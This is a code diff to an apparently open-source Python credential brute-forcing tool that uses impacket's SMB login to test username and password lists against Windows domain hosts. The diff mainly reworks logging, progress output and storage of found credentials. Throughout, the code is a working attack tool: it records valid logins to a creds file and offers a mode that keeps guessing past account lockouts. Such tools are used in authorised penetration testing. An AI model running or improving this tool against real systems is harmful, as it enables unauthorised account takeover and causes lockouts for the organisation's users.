@@ -29,7 +29,8 @@ import sys
 import os
 import pathlib
 import logging
-import shutil
+import logging.handlers
+import time
 
 try:
 	from impacket.smbconnection import SMBConnection
@@ -38,32 +39,13 @@ except ImportError:
 	sys.exit(os.EX_SOFTWARE)
 
 def get_timestamp():
-	return datetime.datetime.now().astimezone().strftime('%I:%M %p %z on %B %d, %Y')
+	hmsp = datetime.datetime.now().strftime('%I:%M %p')
+	tz = time.strftime('%Z')
+	bdy = datetime.datetime.now().strftime('%B %d, %Y')
+	return f"{hmsp} {tz} on {bdy}"
 
 def is_readable_file(path):
 	return os.path.isfile(path) and os.access(path, os.R_OK)
-
-def write(msg, file):
-	# create the file if it doesn't exist:
-	if not is_readable_file(file):
-		with open(file, 'w'):
-			pass
-	# append msg to the file with newline:
-	with open(file, 'a') as f:
-		f.write(f"{msg}\n")
-
-class LoggingAdapter(logging.LoggerAdapter):
-	def process(self, msg, kwargs):
-		timestamp_true = kwargs.pop('time', self.extra['time'])
-		log_true = kwargs.pop('log', self.extra['log'])
-		creds = kwargs.pop('creds', self.extra['creds'])
-		if timestamp_true:
-			msg = f"{datetime.datetime.utcnow().strftime('[%Y-%m-%d %H:%M:%S UTC]')} {msg}"
-		if log_true:
-			write(msg, output_log)
-		if creds:
-			write(creds, output_creds)
-		return f"{msg}", kwargs
 
 class MMCBrute(object):
 	def __init__(self, usernames, passwords, domain, target, output_log, output_creds,
@@ -79,22 +61,27 @@ class MMCBrute(object):
 		self.user_as_pass = user_as_pass
 		self.output_log = output_log
 		self.output_creds = output_creds
-		self.logger = logging.getLogger(logging.basicConfig(level=getattr(logging, loglvl), format=''))
 		self.logger = logging.getLogger(__name__)
-		"""
-		self.logfile_formatter = logging.Formatter("%(asctime)s - %(message)s")
-		self.console_formatter = logging.Formatter('')
-		self.file_handler = logging.FileHandler(self.output_log)
-		self.file_handler.setFormatter(self.logfile_formatter)
-		self.console_handler = logging.StreamHandler()
-		self.console_handler.setFormatter(self.console_formatter)
-		self.logger.addHandler(self.file_handler)
-		self.logger.addHandler(self.console_handler)
-		"""
-		self.log = LoggingAdapter(self.logger, {"time": None, "log": None, "creds": None})
+		self.logger.setLevel(loglvl)
+		self.formatter = logging.Formatter(f"{datetime.datetime.utcnow().strftime('%Y-%m-%d %H:%M:%S')} - %(message)s")
+		self.logfilehandler = logging.handlers.RotatingFileHandler(
+			self.output_log,
+			maxBytes=10 * 1024 * 1024,
+			backupCount=1,
+			encoding=None,
+			delay=0
+		)
+		self.consolehandler = logging.StreamHandler()
+		self.consolehandler.setLevel(loglvl)
+		self.consolehandler.setFormatter(logging.Formatter("%(message)s"))
+		self.logfilehandler.setFormatter(self.formatter)
+		self.logger.addHandler(self.logfilehandler)
+		self.logger.addHandler(self.consolehandler)
 		self.count = 0
 		self.len_passwords = 0
 		self.len_targets = 1
+
+
 
 		if passwords is not None:
 			self.passwords = open(passwords, 'r')
@@ -121,8 +108,12 @@ class MMCBrute(object):
 
 	def update_progress(self):
 		self.count += 1
-		sys.stdout.write(f"[+]Progress: {self.count}/{self.totals} ({round((100 * self.count / self.totals), 2)}%) {' ' * 10}\r")
+		sys.stdout.write(f"\033[33m[+] Progress:\t\t{self.count}/{self.totals} ({round((100 * self.count / self.totals), 2)}%) {' ' * 10}\r\033[0m")
 		sys.stdout.flush()
+
+	def write_creds(self, msg=None):
+		with open(self.output_creds, 'a') as f:
+			f.write(f"{msg}\n")
 
 	def run(self):
 		for target in self.targets:
@@ -156,67 +147,67 @@ class MMCBrute(object):
 		try:
 			# This line will always raise an exception unless the credentials can initiate an smb connection
 			smb_connection.login(username, password, domain)
-			self.log.info(f"\033[92m[+] Success (Account Active) on {target}: {attempt}\033[0m",
-			              time=True, log=True, creds=attempt)
+			self.logger.info(f"\033[92m[+] Success (Account Active) on {target}: {attempt}\033[0m")
+			self.write_creds(attempt)
 			return True
 
 		except Exception as msg:
 			msg = str(msg)
 			if 'STATUS_NO_LOGON_SERVERS' in msg:
-				self.log.info(f"\033[93m[-] No Logon Servers Available on {target}\033[0m", time=True, log=True)
+				self.logger.info(f"\033[93m[-] No Logon Servers Available on {target}\033[0m")
 				sys.exit(os.EX_SOFTWARE)
 
 			elif 'STATUS_LOGON_FAILURE' in msg:
 				if self.verbose:
-					self.log.info(f"\033[91m[-] Failed on {target}: {attempt}\033[0m", time=True, log=True)
+					self.logger.info(f"\033[91m[-] Failed on {target}: {attempt}\033[0m")
 				return False
 
 			elif 'STATUS_ACCOUNT_LOCKED_OUT' in msg:
-				self.log.error(f"\033[93m[-] Account Locked Out on {target}: {attempt}\033[0m", time=True, log=True)
+				self.logger.error(f"\033[93m[-] Account Locked Out on {target}: {attempt}\033[0m")
 				if not self.honeybadger:
-					self.log.info(
+					self.logger.info(
 						'\033[94m[!] Honey Badger mode not enabled. Halting to prevent further lockouts..\033[0m')
 					answer = str(raw_input('\033[94m[!] Would you like to proceed with the bruteforce? (Y/N) '))
 					if answer.lower() in ["y", "yes", ""]:
-							self.log.info('\033[93m[*] Resuming...', time=True, log=True)
+							self.logger.info('\033[93m[*] Resuming...')
 							return False
 					else:
-							self.log.info('\033[91m[-]Exiting...', time=True, log=True)
+							self.logger.info('\033[91m[-]Exiting...')
 							sys.exit(os.EX_SOFTWARE)
 
 			elif 'STATUS_PASSWORD_MUST_CHANGE' in msg:
-				self.log.info(f"\033[92m[+] Success (User never logged in to change password) {attempt}\033[0m",
-				              time=True, log=True, creds=attempt)
+				self.logger.info(f"\033[92m[+] Success (User never logged in to change password) {attempt}\033[0m")
+				self.write_creds(attempt)
 
 			elif 'STATUS_ACCESS_DENIED' in msg or 'STATUS_LOGON_TYPE_NOT_GRANTED' in msg:
-				self.log.info(f"\033[92m[+] Success (Account Active) {attempt}\033[0m", time=True, log=True)
+				self.logger.info(f"\033[92m[+] Success (Account Active) {attempt}\033[0m")
+				self.write_creds(attempt)
 
 			elif 'STATUS_PASSWORD_EXPIRED' in msg:
-				self.log.info(f"\033[92m[+] Success (Password Expired) {attempt}\033[0m",
-				              time=True, log=True, creds=attempt)
+				self.logger.info(f"\033[92m[+] Success (Password Expired) {attempt}\033[0m")
+				self.write_creds(attempt)
 
 			elif 'STATUS_ACCOUNT_DISABLED' in msg:
-				self.log.info(f"\033[91m[-] Valid Password (Account Disabled) {attempt}\033[0m", time=True, log=True)
+				self.logger.info(f"\033[91m[-] Valid Password (Account Disabled) {attempt}\033[0m")
 
 			else:
-				self.log.info(f"\033[91m[-] Unknown error: {msg}\t{attempt}\033[0m", time=True, log=True)
+				self.logger.info(f"\033[91m[-] Unknown error: {msg}\t{attempt}\033[0m")
 			return True
 
 	def end(self):
-		self.log.info(f"\033[94m\n", log=True)
-		self.log.info(f"Ended at:\t\t{get_timestamp()}\033[0m\n",
-		              log=True)
+		print() # (Cleans up output and log)
+		self.logger.info(f"\033[94mFinished at:\t\t{get_timestamp()}\033[0m")
 
 	def info(self):
-		self.log.info(f"\033[94mTarget:\t\t\t{self.target}", log=True)
-		self.log.info(f"Target count:\t\t{self.len_targets}", log=True)
-		self.log.info(f"Username count:\t\t{self.len_usernames}", log=True)
-		self.log.info(f"Password count:\t\t{self.len_passwords}", log=True)
-		self.log.info(f"Estimated attempts:\t{self.totals}", log=True)
-		self.log.info(f"User-as-Pass Mode:\t{self.user_as_pass}", log=True)
-		self.log.info(f"Honey Badger Mode:\t{self.honeybadger}", log=True)
-		self.log.info(f"Verbose:\t\t{self.verbose}", log=True)
-		self.log.info(f"Time:\t\t\t{get_timestamp()}\033[0m\n", log=True)
+		self.logger.info(f"\033[94mStarted at:\t\t{get_timestamp()}\033[0m")
+		self.logger.info(f"\033[94mTarget:\t\t\t{self.target}\033[0m")
+		self.logger.info(f"\033[94mTarget count:\t\t{self.len_targets}\033[0m")
+		self.logger.info(f"\033[94mUsername count:\t\t{self.len_usernames}\033[0m")
+		self.logger.info(f"\033[94mPassword count:\t\t{self.len_passwords}\033[0m")
+		self.logger.info(f"\033[94mEstimated attempts:\t{self.totals}\033[0m")
+		self.logger.info(f"\033[94mUser-as-Pass Mode:\t{self.user_as_pass}\033[0m")
+		self.logger.info(f"\033[94mHoney Badger Mode:\t{self.honeybadger}\033[0m")
+		self.logger.info(f"\033[94mVerbose Mode:\t\t{self.verbose}\033[0m")
 
 if __name__ == '__main__':
 	script_path = os.path.dirname(os.path.abspath(__file__))
@@ -225,11 +216,11 @@ if __name__ == '__main__':
 	parser = argparse.ArgumentParser(add_help=True, description='Use MMC DCOM to bruteforce valid credentials')
 	parser.add_argument('-L', dest='loglvl', action='store', choices=['DEBUG', 'INFO', 'WARNING', 'ERROR', 'CRITICAL'], default='INFO', help='set the logging level')
 	group = parser.add_argument_group('Bruteforce options')
-	group.add_argument('-t', '--target', action='store', required=True, dest='target', help='Windows domain joined IP address')
+	group.add_argument('-t', '--target', action='store', required=True, dest='target', help='Windows domain joined IP address or path to text file containing IPs')
 	group.add_argument('-d', '--domain', action='store', default='.', dest='domain', help='Target domain name (same domain you prepend a username with to login)')
-	group.add_argument('-p', '--passwords', action='store', dest='passwords', help='Text file of passwords')
+	group.add_argument('-p', '--passwords', action='store', dest='passwords', help='Password or path to text file containing passwords')
 	group.add_argument('-U', '--user-as-pass', action='store_true', dest='uap', help='Attempt to login with user as pass')
-	group.add_argument('-u', '--usernames', action='store', required=True, dest='usernames', help='Text file of usernames')
+	group.add_argument('-u', '--usernames', action='store', required=True, dest='usernames', help='Path to text file containing usernames')
 	group.add_argument('-b', '--honeybadger', action='store_true', dest='hb', help='Enable Honey Badger mode (ignore account locks out)')
 	group.add_argument('-o', '--output', action='store', dest='output_log', default='./logs/mmcbrute.log', help='Path to output logfile')
 	group.add_argument('-c', '--creds', action='store', dest='output_creds', default='./logs/creds.log', help='Path to output creds file')
@@ -249,12 +240,6 @@ if __name__ == '__main__':
 
 	# Make sure logs directory exists:
 	pathlib.Path('./logs').mkdir(exist_ok=True)
-
-	# Roll existing logs:
-	if is_readable_file(options.output_log):
-		shutil.move(options.output_log, f"./logs/mmcbrute.{datetime.datetime.utcnow().strftime('%Y%m%d_%H%M')}.log")
-	if is_readable_file(options.output_creds):
-		shutil.move(options.output_creds, f"./logs/creds.{datetime.datetime.utcnow().strftime('%Y%m%d_%H%M')}.log")
 
 	brute = MMCBrute.from_args(options)
 	try:
